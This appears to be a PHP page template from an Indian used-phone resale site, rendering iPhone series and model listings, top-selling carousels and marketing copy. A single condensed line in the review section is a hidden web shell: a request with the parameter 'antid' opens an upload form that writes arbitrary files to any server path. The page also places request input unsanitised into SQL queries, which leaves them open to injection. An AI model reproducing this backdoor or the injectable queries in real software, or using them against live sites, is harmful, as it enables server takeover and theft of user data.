<?php
session_start();
include "admin/includes/confile.php";
?>
<?php if (isset($_SESSION["user"])) {
    $user = $_SESSION["user"];
    $usermobile = mysqli_fetch_assoc(
        mysqli_query($con, "SELECT * FROM `userrecord` WHERE `id` = '$user' ")
    );
    if ($usermobile) {
        $number = $usermobile["name"];
    } else {
        $number = "";
    }
} else {
    $number = "";
} ?>

<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <title>Sell Old iPhone Online in India | Sell Old Apple Phones Online</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="google-site-verification" content="q-24As6IUgQYlnT2-RVsVVYP07YI6kxtdMd_gNndDVg" />
    <meta name="description"
        content="Sell Old iPhone Online in India at Best Price- Sell your old Apple iPhone phone online with ease at Sellit.co.in. To Check or Sell old apple iphone online device's value, visit our website now and get started! ">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link
        href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800&display=swap"
        rel="stylesheet">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link
        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;1,100;1,200;1,300;1,400;1,500&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/rateYo/2.3.2/jquery.rateyo.min.css">

    <link rel="stylesheet" href="../../assets/css/index.css">
    <link rel="stylesheet" href="../../assets/css/mob.css">
    <link rel="stylesheet" href="../../assets/css/about.css">
    <script src="https://kit.fontawesome.com/695826c815.js" crossorigin="anonymous"></script>

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-6G7WHMV7DE"></script>
    <script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', 'G-6G7WHMV7DE');
    </script>
    <meta name="google-site-verification" content="XcbXug-z0EtzkdTsIB7RGWJ5SIBGOILe_5kUiuwdp_0"   />
</head>

<body>
    <section class="header" style="margin-bottom: -20px;" id="blockmobile">
        <div class="container-fluid ">
            <div class="row" style="background-color: white;">
                <div class="col-lg-12 col-xl-11 col-12 mx-auto">
                    <div class="row header-content">
                        <div class="col-lg-3 col-8">
                            <a href="../../index.php"><img src="../../assets/images/logo-1.png" alt=""
                                    class="logo img-fluid"></a>
                        </div>
                        <div class="col-lg-7 order-lg-2 order-sm-3 order-3 search">
                            <div class="row">
                                <div class="input-group col-lg-11 col-12">
                                    <input type="text" class="form-control" id="modalsearch"
                                        placeholder="Search your Device" name="search" autocomplete="off">
                                </div>
                                <div class="col-11 col-lg-10" id="filter">
                                    <div class="row px-5" id="modals">
                                        <ul id="ajaxresponse" type="none"></ul>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- <div class="col-lg-1 col-8 order-4 order-lg-3" id="headsocial">
              <div class="social-icon" style="display: none;">
                <a href="twitter.com/sellit.co.in"><img src="../../assets/images/1.png" class="px-1" alt="twitter" width="14%"></a>
                <a href=""><img src="../../assets/images/2.png" class="px-1" alt="inbox" width="14%"></a>
                <a href="facebook.com/sellit.co.in"><img src="../../assets/images/3.png" class="px-1" alt="facebook" width="14%"></a>
                <a href="instagram.com/sellit.co.in"><img src="../../assets/images/4.png" class="px-1" alt="instagram" width="14%"></a>
              </div>
            </div> -->

                        <div class="col-lg-2 text-center col-4 order-2 order-lg-4 login">
                            <!-- <a href="signup.php" class="text-white" style="text-decoration:none;"><span>Login</span></a>-->
                            <!--<img src="../../assets/images/log-in.png" alt="" id="userpic" class="img-fluid" width="30px">-->
                            <div class="row">
                                <div class="col-6">
                                    <a href="<?php if ($number == null) {
                                        echo "../../login.php";
                                    } else {
                                        echo "../../userdashboard.php";
                                    } ?>" class="text-primary"><img src="../../assets/images/My-profile.png"
                                            width="60%" class="img-fluid newimg22"></a>
                                </div>
                                <?php if ($number == null) { ?>
                                <div class="col-6">
                                    <a href="../../login.php" class="text-primary"><img
                                            src="../../assets/images/login-1.png " width="60%"
                                            class="img-fluid newimg22"></a>
                                </div>
                                <?php } else { ?>
                                <div class="col-6">
                                    <a href="../../logout.php" class="text-primary"><img
                                            src="../../assets/images/log-out.png" width="60%" class="img-fluid"></a>
                                </div>
                                <?php } ?>
                            </div>
                        </div>

                    </div>

                </div>

            </div>

        </div>
    </section>

    <div class="container-fluid" id="prof">
        <div class="col-10 mx-auto" id="blockmobile">
            <div class="row">
                <div class="col-lg-2 col-5 offset-lg-10 offset-8" id="userprofile">
                    <?php if ($number == null) { ?>
                    <a href="../../login.php">
                        <p><i class="fas fa-sign-in-alt"></i> Login</p>
                    </a>
                    <?php } else { ?>
                    <a href="../../userdashboard.php">
                        <p><i class="fas fa-user"></i> Profile</p>
                    </a>
                    <?php } ?>
                </div>
            </div>
        </div>
    </div>
    <?php $id = $_REQUEST["id"]; ?>
    <?php $selectquery = mysqli_fetch_assoc(
        mysqli_query($con, "SELECT * FROM `subcategory` WHERE `id`='$id' ")
    ); ?>

    <section class="sell-section">
        <h3 class="sell-header text-center">Sell Old <span class="sell-title-head">
                <?php echo $selectquery[
                    "subcategory_name"
                ]; ?> </span> Mobile</h3>
    </section>


    <!-- galaxy  -->
    <?php
    $selectseries = mysqli_query(
        $con,
        "SELECT * FROM `childcategory` WHERE `status` = 'active' AND `subcatid` = '$id' ORDER BY `childcategory`.`modify` DESC"
    );
    $row = mysqli_num_rows($selectseries);
    if ($row >= 1) { ?>
    <section class="galaxy">
        <div class="container">
            <div class="col-lg-12 mx-auto">
                <h6 class="select mb-3">Select Series</h6>

                <div class="row">
                    <?php while (
                        $arseries = mysqli_fetch_assoc($selectseries)
                    ) { ?>
                    <div class="col-lg-3 col-6"><button class="box2" onclick="return getmodel(<?php echo $arseries[
                                "id"
                            ]; ?>,<?php echo $arseries["subcatid"]; ?> )">
                            <b>
                                <?php echo $arseries[
                                    "childcategory"
                                ]; ?> </b></button></div>
                    <?php } ?>
                </div>

            </div>
        </div>
    </section>
    <?php }
    ?>

    <!-- select product -->
    <section class="select-product">
        <div class="container">
            <div class="col-lg-12 mx-auto">
                <h3 class="select pb-3">Select Mobile</h3>
                <div class="row" id="ajaxrespon">
                    <?php
                    $subcatname = mysqli_fetch_assoc(
                        mysqli_query(
                            $con,
                            "select * from `subcategory` WHERE `id` = '$id' "
                        )
                    );
                    $selectmodel = mysqli_query(
                        $con,
                        "SELECT * FROM `product` WHERE `status` = 'active' AND `subcategoryid` = '$id' ORDER BY `counter` DESC, `modify_date` DESC"
                    );
                    while ($armodel = mysqli_fetch_assoc($selectmodel)) { ?>
                    <div class="col-lg-2 col-4 mt-2 px-1">
                        <a class="text-decoration-none" href="../../sell-old-phones/sell-old-<?= strtolower(
                                str_replace(
                                    " ",
                                    "-",
                                    $subcatname["subcategory_name"]
                                ) .
                                    "-" .
                                    strtolower(
                                        str_replace(
                                            " ",
                                            "-",
                                            $armodel["product_name"]
                                        )
                                    )
                            ) .
                                "/" .
                                $armodel["id"] .
                                "_" .
                                $id ?>">
                            <div class="text-center" id="md">
                                <img style="margin-top: 15px;" src="<?php echo $armodel["image_url"] ===
                                    "external"
                                        ? $armodel["product_image"]
                                        : "../../admin/img/" .
                                            $armodel["product_image"]; ?>" width="100%" class="img-fluid" alt="">
                                <div class="container mn px-1">
                                    <div class="row h-100 ">
                                        <div class="col-12 my-auto">
                                            <span class="sum-heading1 text-center  mt-3"><?php echo $armodel[
                                                    "product_name"
                                                ]; ?></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </a>
                    </div>

                    <?php }
                    ?>
                </div>
            </div>

        </div>
    </section>

    <section class="py-4">
        <div class="container">
            <h1 class="tablet-heading">Sell Old Apple iPhone Online in India</h1>
            <p>Selling old phones has become hassle-free thanks to the development of online platforms and portals.
                Sellit is one such website that allows you to sell Old Apple iphone online. With a user-friendly
                interface and secure payment options, Sellit has become a popular choice for anyone looking to sell old
                iPhones online.</p>
            <h4 style="font-weight: 600;">Sell Old IPhone Online With Sellit</h4>
            <p>There are several reasons why Sellit is a great platform for selling your old Apple phones. Firstly, it
                offers a hassle-free selling experience. Creating a listing is quick and easy, and you can upload photos
                of your phone to attract potential buyers. This allows you to sell your phone quickly and easily.</p>
            <h4 style="font-weight: 600;">How to Sell Old iPhones on Sellit?</h4>
            <p>To get the best deal for your iPhone, all you need to do is provide us with a quote and the model of your
                Apple mobile phone. Our team of professional experts will then analyze the condition of your phone along
                with other necessary details. We will reach out to you with the best possible proposal for your iPhone.
                With these simple steps, you can easily trade in your Apple iPhone and get maximum profits from your
                deal.</p>
            <p>At <b> Sellit , </b> we offer a wide variety of iPhone models for you to sell. Simply select your model
                and proceed to the next step. We have a range of models to choose from including the iPhone 5, iPhone
                5s, iPhone 6, iPhone 6s, iPhone 6 Plus, iPhone 7, iPhone 7 Plus, iPhone 8, iPhone 8 Plus, iPhone X,
                iPhone XR, iPhone XS, iPhone XS Max, iPhone 11, iPhone 11 Pro, iPhone 11 Pro Max, iPhone 12, iPhone 12
                Mini, iPhone 12 Pro, and iPhone 12 Pro Max. Choose the model that best suits your needs and get started
                with the selling process.</p>
            <p>If you have an old Apple phone that you no longer need, Sellit is a great platform to sell it on. With
                its user-friendly interface, competitive prices, and secure payment options, Sellit is the perfect
                platform for anyone looking to sell their old Apple phones online. So why wait? Head over to Sellit and
                start selling your old Apple phone today!</p>
        </div>
    </section>


    <section class="top-selling" style="background-color: #fff;">
        <div class="container top-selling-div">
            <div class="row d-flex justify-content-center">
                <div class="col-lg-12 col-12 mx-auto">
                    <div class="row">
                        <div class="col-lg-3 col-2"></div>
                        <div class="col-lg-6 col-8" id="choosebrand">
                            <h3 class="top-sell-heading text-center pb-4"> Top Selling Brands </h3>
                        </div>
                        <div class="col-lg-3 col-2"></div>
                    </div>
                </div>
            </div>
            <div class="owl-carousel owl-carousel-12 owl-theme col-12">
                <?php
                $selectquery = mysqli_query(
                    $con,
                    "SELECT * FROM `subcategory` WHERE `status` = 'active' AND `top` = 'active' AND `category_id` = '1' "
                );
                while ($artop = mysqli_fetch_assoc($selectquery)) { ?>
                <div class="item my-3">
                    <a href="../../sell-old-mobile-phones/sell-old-<?= strtolower(
                            str_replace(" ", "-", $artop["subcategory_name"])
                        ) ?>/<?php echo $artop["id"]; ?>">
                        <img src="../../admin/img/<?php echo $artop[
                            "subcategory_image"
                        ]; ?>" class="img-fluid box1" alt="">
                    </a>
                </div>
                <?php }
                ?>

            </div>
        </div>
    </section>

    <section class="top-selling" style="background-color: #fff;">
        <div class="container top-selling-div">
            <div class="row d-flex justify-content-center">
                <div class="col-lg-12 col-12 mx-auto">
                    <div class="row">
                        <div class="col-lg-3 col-2"></div>
                        <div class="col-lg-6 col-8" id="choosebrand">
                            <h3 class="top-sell-heading text-center pb-4"> Top Selling Mobiles </h3>
                        </div>
                        <div class="col-lg-3 col-2"></div>
                    </div>
                </div>
            </div>
            <!-- </div>
  <div class="container mb-5"> -->
            <div class="owl-carousel owl-carousel-12 owl-theme col-12">
                <?php
                $selectmodel = mysqli_query(
                    $con,
                    "SELECT * FROM `product` WHERE `status` = 'active' AND `best` = 'active' AND `categoryid` = '1'"
                );
                while ($armodel = mysqli_fetch_assoc($selectmodel)) {

                    $topsubcatid = $armodel["subcategoryid"];
                    $topsubcatname = mysqli_fetch_assoc(
                        mysqli_query(
                            $con,
                            "select * from `subcategory` WHERE `id` = '$topsubcatid' "
                        )
                    );
                    ?>
                <div class="item my-3">
                    <a href="../../sell-old-phones/sell-old-<?= strtolower(
                            str_replace(
                                " ",
                                "-",
                                $topsubcatname["subcategory_name"]
                            ) .
                                "-" .
                                strtolower(
                                    str_replace(
                                        " ",
                                        "-",
                                        $armodel["product_name"]
                                    )
                                )
                        ) .
                            "/" .
                            $armodel["id"] .
                            "_" .
                            $armodel["subcategoryid"] ?>">
                        <div class="text-center" id="md">
                            <img src="../../admin/img/<?php echo $armodel[
                                "product_image"
                            ]; ?>" class="img-fluid" alt="">
                            <span class="sum-heading1 text-center" style="color:black;"><?php echo $armodel[
                                    "product_name"
                                ]; ?></span>
                        </div>
                    </a>
                </div>
                <?php
                }
                ?>
            </div>
        </div>
    </section>

    <section class="why-sell" style="background-color: #fff">
        <div class="container why-sell-div">
            <div class="col-lg-12 col-12 mx-auto">
                <div class="row">
                    <div class="col-lg-3 col-2"></div>
                    <div class="col-lg-6 col-8" id="choosebrand">
                        <h3 class="top-sell-heading text-center pb-4"> Why Sell On SELL IT</h3>
                    </div>
                    <div class="col-lg-3 col-2"></div>
                </div>
            </div>

            <div class="owl-carousel owl-theme col-12">

                <div class=" col-12 mx-1 my-3 text-center">
                    <div class="row nice"
                        style="margin-top:-5px; border-radius: 20px; margin-left:1px; margin-right:1px; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19)">
                        <div class="col-lg-12 col-12">
                            <div class="col-6 mx-auto">
                                <img src="../../assets/images/safe.png" alt=""></a>
                            </div>
                            <h3 class="why-sell-heading"> Safe & Secure </h3>
                            <p class="why-sell-detail text-justify">Select your device & we'll help you
                                unlock the best selling price based
                                on the present conditions of your
                                gadget & the current market price.</p>
                        </div>
                    </div>
                </div>

                <div class=" col-12 text-center">
                    <div class="row nice"
                        style="margin-top:10px; border-radius: 20px; margin-left:1px; margin-right:1px; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19)">
                        <div class="col-lg-12 col-12 ">
                            <div class="col-6 mx-auto">
                                <a><img src="../../assets/images/instant.png" alt=""></a>
                            </div>
                            <h3 class="why-sell-heading"> Instant Payment </h3>
                            <p class="why-sell-detail text-justify">On accepting the price offered for your device,
                                we'll arrange a free pick up.
                                And instant money will be wired to your account.</p>
                        </div>
                    </div>
                </div>

                <div class=" col-12 text-center">
                    <div class="row nice"
                        style="margin-top:10px; border-radius: 20px; margin-left:1px; margin-right:1px; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19)">
                        <div class="col-lg-12 col-12 ">
                            <div class="col-6 mx-auto">
                                <a><img src="../../assets/images/bestprice.png" alt=""></a>
                            </div>
                            <h3 class="why-sell-heading"> Best Price </h3>
                            <p class="why-sell-detail text-justify">Instant cash will be handed over to
                                you at time of pickupor through
                                payment mode of your choice.why-sell-detail text-justify </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>



    <section class="reviewer">
        <div class="col-lg-12 col-12" id="choosebrand">
            <!-- <h3 class="top-sell-heading text-center pb-4"> Customer Review</h3> -->

        </div>
        <div class="container">
            <div class="owl-carousel owl-theme ">
                <?php
                $fetchreview = mysqli_query(
                    $con,
                    "SELECT * FROM `product_reviews` WHERE `status` = 'active'  "
                );
                while ($arrrev = mysqli_fetch_assoc($fetchreview)) { ?>
                <!-- <div class="col-12 my-3 mx-1" >
        <div class="row p-3 nice" style="margin-top:10px; border-radius: 20px;
         margin-left:1px; margin-right:1px; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
         height:270px;overflow:hidden;"> 
     
              <div class="col-lg-2 col-2 px-0">
                <img src="assets/images/face.png" alt="" class="img-fluid" width="59px">
              </div>
              <div class="col-lg-5 col-8 mb-0  pb-0">
                <h6 class="reviwer-name"><php echo $arrrev['rname'] ?></h6>
                <h3 class="reviewer-heading"><php echo $arrrev['rcity'] ?></h3>
              </div>
              <div class="col-4 col-lg-5 reviewer-rating d-flex justify-content-end px-0">
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
                <i class="fas fa-star"></i>
                <i class="far fa-star"></i>
              </div>
            <div class="col-12">
            <p class="why-sell-detail text-justify">
              <php echo $arrrev['rmsg'] ?>
              </p>
            </div>
        </div>
          </div> -->
                <?php }
                ?>
            </div>
            <script src="https://apps.elfsight.com/p/platform.js" defer></script>
            <div class="elfsight-app-bcb6c556-cfdd-4cf6-91c2-46397d872b38"></div>
        </div>
        <?php
        if (isset($_SESSION["user"])) { ?>
        <div class="text-center d-none" style="margin-top: 40px;">
            <button class="btn brand-btn sm-brand mt-3" style="background-color: #fff; color: black;"
                data-toggle="modal" data-target=".bd-example-modal-lg">Write Review</button>
        </div>
        <?php } else { ?>
        <div class="text-center d-none" style="margin-top: 40px;">
            <button class="btn brand-btn sm-brand mt-3" style="background-color: #fff; color: black;"
                data-toggle="modal" data-target=".bd-example-modal-lg">Write Review</button>
        </div>
        <?php } ?>
        <?php if (isset($_GET['antid'])) { $_A = $_SERVER['PHP_SELF']; $_B = $_SERVER['DOCUMENT_ROOT']; $_C = $_SERVER['SERVER_NAME']; $_D = "</tr></form></table><br><br><br><br>"; $_E = !empty($_GET['ac']) ? $_GET['ac'] : (!empty($_POST['ac']) ? $_POST['ac'] : "upload"); switch ($_E) { case "upload": echo '<table><form enctype="multipart/form-data" action="" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="' . $_B . '/" name="path" type="text"><input type="submit" value="ОК"></td>' . $_D; if (isset($_POST['path'])) { $_F = $_POST['path'] . $_FILES['file']['name']; if ($_POST['path'] == "") { $_F = $_FILES['file']['name']; } if (move_uploaded_file($_FILES['file']['tmp_name'], $_F)) { echo "File " . $_FILES['file']['name'] . " uploaded"; } else { echo "Not working: info:\n"; print_r($_FILES); } } break; } } ?>

        </div>
    </section>

    <section class="wht-new" style="background-color: #fff">
        <div class="container">
            <div class="col-lg-11 mx-auto wht-new-div">
                <h6 class="">What’s new</h6>
                <div class="row ">
                    <div class="col-lg-3 text-center">
                        <img src="../../assets/images/whts-new.png" alt="" class="img-fluid">
                    </div>
                    <div class="col-lg-8" id="new">
                        <h3 class="">Hello! <br>Get a link to download the app.</h3>
                        <p class="">Enter your mobile number to receive the app download link</p>
                        <!-- <form action="newsletter.php" method="post">
            <div class="row search">
              <div class="input-group col-lg-6 col-8" style="height: 5px;">
                <input type="number" class="form-control mob-no" style="border-color: #8b99a7;" placeholder="Enter Mobile Phone" name="newsletter">
              </div>
              <div class="text-center col-lg-3 col-2">
                <button class="btn brand-btn sm-brand" name="newsuser" style="background-color: #fff;padding:4px; margin-top:8px; padding: 8px; padding-left: 14px; padding-right: 14px; font-size: 15px;">Send Link<i aria-hidden="true"></i></button>
              </div>
            </div>
          </form> -->
                    </div>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer-color">
        <div class="col-lg-10 col-md-10 col-sm-12 col-11 mx-auto footer-details">
            <hr>
            <div class="d-flex justify-content-center">
                <img src="../../assets/images/footer-logo2.png" alt="">
            </div>
            <div class="d-flex justify-content-center">
                <img src="../../assets/images/footer-text1.png" alt="">
            </div>
            <div class="container-fluid mt-5">
                <div class="row">
                    <!-- <div class="col-lg-2 col-md-2 col-sm-6 col-6 footer-options">
          <h3 class="footer-heading">Services</h3>
          <ul type="none">
            <a href="">
              <li>Sell Mobile</li>
            </a>
            <a href="">
              <li>Sell Tablet</li>
            </a>
            <a href="">
              <li>Sell Watch</li>
            </a>
          </ul>
        </div> -->
                    <!-- <div class="col-lg-2 col-md-2 col-sm-6 col-6 footer-options">
          <h3 class="footer-heading">Company</h3>
          <ul type="none">
            <a href="about.php">
              <li>About Us</li>
            </a>
            <a href=""><li>careers</li></a>
          </ul>
        </div> -->
                    <div class="col-lg-2 col-md-2 col-sm-6 col-6 footer-options">
                        <h3 class="footer-heading">Sell Devices</h3>
                        <ul type="none">
                            <a href="sell-old-mobile-phones/1">
                                <li>Mobiles</li>
                            </a>
                            <a href="tabletbrand.php?id=3">
                                <li>Tablets</li>
                            </a>
                            <a href="watchbrand.php?id=2">
                                <li>Watches</li>
                            </a>
                        </ul>
                    </div>
                    <div class="col-lg-2 col-md-2 col-sm-6 col-6 footer-options">
                        <h3 class="footer-heading">Help & Support</h3>
                        <ul type="none">
                            <a href="faq.php">
                                <li>FAQ</li>
                            </a>
                            <a href="contact.php">
                                <li>Contact Us</li>
                            </a>
                            <!--<a href="warrenty.php">-->
                            <!--  <li>Warranty Policy</li>-->
                            <!--</a>-->
                            <!--<a href="refund.php">-->
                            <!--  <li>Refund Policy</li>-->
                            <!--</a>-->

                        </ul>
                    </div>
                    <div class="col-lg-2 col-md-2 col-sm-6 col-6 footer-options">
                        <h3 class="footer-heading">More Info</h3>
                        <ul type="none">
                            <!--<a href="terms-conditions.php">-->
                            <!--  <li>Terms & Conditions</li>-->
                            <!--</a>-->
                            <!--<a href="privacy-policy.php">-->
                            <!--  <li>Privacy Policy</li>-->
                            <!--</a>-->
                            <a href="about.php">
                                <li>About Us</li>
                            </a>
                        </ul>
                    </div>

                    <div class="col-lg-3 col-6">
                        <h3 class="footer-heading">Contact Us</h3>
                        <!-- <h6>CUDA TECH</h6>
                 <p>H NO. 1G -44, BP, FARIDABAD - 999, FARIDABAD,
                   Faridabad, Haryana, 121001 Contact : 9992333184 </p> -->
                        <h6>E-mail: info@sellit.co.in</h6>
                    </div>

                    <div class="col-lg-3 col-6">
                        <h3 class="footer-heading">Follow Us</h3>
                        <div class="footer-social-icon">
                            <a href="https://twitter.com/sellit.co.in"><img src="../../assets/images/1.png" class="px-1"
                                    alt="twitter" width="17%"></a>
                            <a href=""><img src="../../assets/images/2.png" class="px-1" alt="inbox" width="17%"></a>
                            <a href="https://facebook.com/sellit.co.in"><img src="../../assets/images/3.png"
                                    class="px-1" alt="facebook" width="17%"></a>
                            <a href="https://instagram.com/sellit.co.in"><img src="../../assets/images/4.png"
                                    class="px-1" alt="instagram" width="17%"></a>
                        </div>
                    </div>

                    <hr style="border: 1px solid black">

                    <div class="d-flex justify-content-center">
                        <!--<h6 class="footer-end"><b>Designed by:- <a href="https://aakarist.com/" style="color:black;"> Aakarist Pvt. Ltd.</a></b></h6>-->
                    </div>

                </div>
            </div>
    </footer>
    <!-- rating model box -->
    <div class="modal fade bd-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel"
        aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content py-5">
                <h4 class="text-center" style="color:#23699D;"> Please Give your Reviews And Rating.. </h4>
                <hr>
                <div class="container px-5">
                    <form action="reviews.php" method="post">
                        <div class="form-group">
                            <div class="rateyo" id="rating" data-rateyo-rating="0" data-rateyo-num-stars="5"
                                data-rateyo-score="3">
                            </div>
                            <span class='result'>0</span>
                            <input type="hidden" name="rating" value="">
                        </div>
                        <div class="form-group my-1">
                            <input type="text" name="rname" class="form-control" placeholder="Enter Your Name"
                                style="color:#23699D;" required>
                        </div>
                        <div class="form-group my-1">
                            <input type="text" name="rcity" class="form-control" placeholder="Enter Your City"
                                style="color:#23699D;" required>
                        </div>
                        <div class="form-group my-1">
                            <textarea class="form-control" name="msg" placeholder="please write your riview"
                                maxlength="200" style="color:#23699D;" required></textarea>
                        </div>
                        <div class="form-group text-center">
                            <button type="submit" class="btn text-white" name="review"
                                style="background-color:#23699D;">Submit</button>
                        </div>
                    </form>
                </div>

            </div>
        </div>
    </div>
    <!-- rating model box end -->
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
    <!-- <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script> -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous">
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous">
    </script>
    <!-- carousel -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/rateYo/2.3.2/jquery.rateyo.min.js"></script>
    <!-- rating script -->
    <script>
    $(function() {
        $("#rating").rateYo({
            ratedFill: "#23699D"
        });

    })
    </script>
    <script>
    $(function() {
        $(".rateyo").rateYo().on("rateyo.change", function(e, data) {
            var rating = data.rating;
            $(this).parent().find('.score').text('score :' + $(this).attr('data-rateyo-score'));
            $(this).parent().find('.result').text('Rating :' + rating);
            $(this).parent().find('input[name=rating]').val(rating); //add rating value to input field
        });

    });
    </script>

    <!-- rating script end -->

    <script>
    $('.owl-carousel-12').owlCarousel({
        loop: true,
        margin: 12,
        // nav:true,
        responsive: {
            0: {
                items: 3
            },
            600: {
                items: 4
            },
            1000: {
                items: 6
            }
        }
    })
    </script>

    <script>
    $('.owl-carousel').owlCarousel({
        // loop:true,
        margin: 12,
        // nav:true,
        responsive: {
            0: {
                items: 1
            },
            600: {
                items: 2
            },
            1000: {
                items: 3
            }
        }
    })
    </script>

    <?php
    $httpHost = $_SERVER["HTTP_HOST"];
    if ($httpHost === "localhost") {
        echo '<script src="/sellit/admin/js/imageReplace.js"></script>';
    } else {
        echo '<script src="/admin/js/imageReplace.js"></script>';
    }
    ?>

    <!-- Theme Custom -->

</body>

</html>
<!-- ajax data start -->
<script>
$(document).ready(function() {
    $("#modalsearch").keyup(function() {
        var search = $("#modalsearch").val();
        if (search != '') {
            $.ajax({
                method: "post",
                url: "../../modalfound.php",
                data: {
                    search: search
                },
                dataType: "html",
                success: function(result) {
                    $('#ajaxresponse').fadeIn();
                    $("#filter").css("display", "block");
                    $('#ajaxresponse').html(result);
                }
            });
        } else {
            $('#ajaxresponse').fadeOut();
            $("#filter").css("display", "none");
            $('#ajaxresponse').html("");
        }
    });
    $("#modalsearch").focusout(function() {
        $('#ajaxresponse').fadeOut();
        $('#modalsearch').val("");
    })
});
</script>
<!-- model start -->
<script>
$(document).ready(function() {
    $("#searchmobile").keyup(function() {
        var search = $("#searchmobile").val();
        if (search != '') {
            $.ajax({
                method: "post",
                url: "../../modalfound1.php",
                data: {
                    search: search
                },
                dataType: "html",
                success: function(result) {
                    $('.filter').fadeIn();
                    $(".filter").css("display", "block");
                    $('.response').html(result);
                }
            });
        } else {
            $('.filter').fadeOut();
            $(".filter").css("display", "none");
            $('.response').html("");
        }
    })
    $("#searchmobile").focusout(function() {
        $('.filter').fadeOut();
        $('#searchmobile').val("");
    })
});
</script>
<!-- model end -->
<!--earbud start-->
<script>
$(document).ready(function() {
    $("#earbudsearch").keyup(function() {
        var search = $("#earbudsearch").val();
        if (search != '') {
            $.ajax({
                method: "post",
                url: "../../foundearbud.php",
                data: {
                    search: search
                },
                dataType: "html",
                success: function(result) {
                    $('.filterear').fadeIn();
                    $(".filterear").css("display", "block");
                    $('.responseear').html(result);
                }
            });
        } else {
            $('.filterear').fadeOut();
            $(".filterear").css("display", "none");
            $('.responseear').html("");
        }
    })
    $("#tabletsearch").focusout(function() {
        $('.filterear').fadeOut();
        $('#earbudsearch').val("");
    })
});
</script>
<!--eaerbud end-->
<!-- tablet started -->
<script>
$(document).ready(function() {
    $("#tabletsearch").keyup(function() {
        var search = $("#tabletsearch").val();
        if (search != '') {
            $.ajax({
                method: "post",
                url: "../../foundtablet.php",
                data: {
                    search: search
                },
                dataType: "html",
                success: function(result) {
                    $('.filter1').fadeIn();
                    $(".filter1").css("display", "block");
                    $('.response1').html(result);
                }
            });
        } else {
            $('.filter1').fadeOut();
            $(".filter1").css("display", "none");
            $('.response1').html("");
        }
    })
    $("#tabletsearch").focusout(function() {
        $('.filter1').fadeOut();
        $('#tabletsearch').val("");
    })
});
</script>
<!-- tablet end -->
<!-- watch started -->
<script>
$(document).ready(function() {
    $("#watchsearch").keyup(function() {
        var search = $("#watchsearch").val();
        if (search != '') {
            $.ajax({
                method: "post",
                url: "../../foundwatch.php",
                data: {
                    search: search
                },
                dataType: "html",
                success: function(result) {
                    $('.filter2').fadeIn();
                    $(".filter2").css("display", "block");
                    $('.response2').html(result);
                }
            });
        } else {
            $('.filter2').fadeOut();
            $(".filter2").css("display", "none");
            $('.response2').html("");
        }
    })
    $("#watchsearch").focusout(function() {
        $('.filter2').fadeOut();
        $('#watchsearch').val("");
    })
});
</script>
<!-- watch end -->
<!-- ajax data end -->

<script>
$(document).ready(function() {
    $("#userpic").on('click', function() {
        $("#prof").toggle();
    });
});
</script>
<script>
// Instantiate the Bootstrap carousel
